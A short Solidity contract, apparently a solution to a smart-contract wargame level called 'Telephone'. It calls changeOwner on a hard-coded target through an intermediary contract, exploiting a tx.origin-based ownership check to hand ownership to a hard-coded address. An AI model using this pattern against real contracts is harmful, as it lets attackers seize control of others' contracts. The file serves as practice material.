// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Telephone{
	function changeOwner(address _owner) public virtual; 
}

contract Claim {
	address contractAddr = 0x469317Aab1Ed5Ac3DFa6c30Bf6aB0fD1dD03898A;
	address claimer = 0xCF73bB567D20892f791AAC0a2E57234f2a6CB009;
	
	function claimOwnership() public {
		Telephone tele = Telephone(contractAddr);
		tele.changeOwner(claimer);
	}
}